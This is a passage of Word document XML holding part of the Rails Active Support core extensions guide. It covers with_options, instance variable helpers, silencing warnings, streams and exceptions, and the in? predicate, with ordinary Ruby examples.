                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  body    i18n.t :body, :user_name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; user.name</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="49985074" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5D714F89" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Since </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>with_options</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> forwards calls to its receiver they can be nested. Each nesting level will merge inherited defaults in addition to their own.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F052371" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/object/with_options.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="632D9CBC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>2.10 Instance Variables</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67E2CDB5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Active Support provides several methods to ease access to instance variables.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02FA8ACC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.10.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>instance_variable_names</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60AB791E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Ruby 1.8 and 1.9 have a method called </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>instance_variables</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> that returns the names of the defined instance variables. But they behave differently, in 1.8 it returns strings whereas in 1.9 it returns symbols. Active Support defines </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>instance_variable_names</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as a portable way to obtain them as strings:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6360"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="652FF5DE" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2D5258E8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>C</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4B298111" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>initialize(x, y)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="12493947" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    @x, @y</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= x, y</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1E2712F1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5C0E593A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2D81F052" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6CED42FE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>C.new(0, 1).instance_variable_names # =&gt; ["@y", "@x"]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7BF83F8E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>The order in which the names are returned is unspecified, and it indeed depends on the version of the interpreter.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DAB18BA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/object/instance_variables.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27E09860" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.10.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>instance_values</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E4257A4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>instance_values</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns a hash that maps instance variable names without “@” to their corresponding values. Keys are strings:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6360"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="17CFE7EB" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="02291456" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>C</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7CFDCE20" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>initialize(x, y)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2FD9AC3F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    @x, @y</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= x, y</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4CB1B8CA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="590AF74C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="14BDF741" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="56C32784" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>C.new(0, 1).instance_values # =&gt; {"x" =&gt; 0, "y" =&gt; 1}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1E00EA9B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/object/instance_variables.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2434F3AF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>2.11 Silencing Warnings, Streams, and Exceptions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E753CF8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The methods </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>silence_warnings</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>enable_warnings</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> change the value of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>$VERBOSE</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> accordingly for the duration of their block, and reset it afterwards:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8160"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="20B63D12" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="12B0B902" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1653681904"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>silence_warnings { Object.const_set "RAILS_DEFAULT_LOGGER", logger }</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0A51AFFD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can silence any stream while a block runs with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>silence_stream</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3240"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="0469B745" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7AD92538" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>silence_stream(STDOUT) do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7775CAE7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  # STDOUT is silent here</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7CF5FFF8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="66A89460" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>quietly</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method addresses the common use case where you want to silence </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>STDOUT</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>STDERR</w:t>
      </w:r>
      <w:r>
        <w:t>, even in subprocesses:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4128"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="7EE7EC5C" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6C511D8F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1918319246"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>quietly { system 'bundle install'</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2263778A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>For example, the railties test suite uses that one in a few places to prevent command messages from being echoed intermixed with the progress status.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CEDB52F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Silencing exceptions is also possible with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>suppress</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. This method receives an arbitrary number of exception classes. If an exception is raised during the execution of the block and is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>kind_of?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> any of the arguments, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>suppress</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> captures it and returns silently. Otherwise the exception is reraised:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7080"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="35663ABD" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="264CB3ED" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># If the user is locked the increment is lost, no big deal.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="679F5B7E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>suppress(ActiveRecord::StaleObjectError) do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6785ED27" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  current_user.increment! :visits</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="17E7DF17" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2DE84625" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/kernel/reporting.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42D7B8FB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.12 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>in?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68E05038" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The predicate </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>in?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> tests if an object is included in another object or a list of objects. An </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ArgumentError</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> exception will be raised if a single argument is passed and it does not respond to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>include?</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="007268C9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Examples of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>in?</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5880"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="4F5040D7" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="402AA4D6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>1.in?(1,2)          # =&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3F0279F7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>1.in?([1,2])        # =&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5D0DBDF6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"lo".in?("hello")   # =&gt; true</w:t>
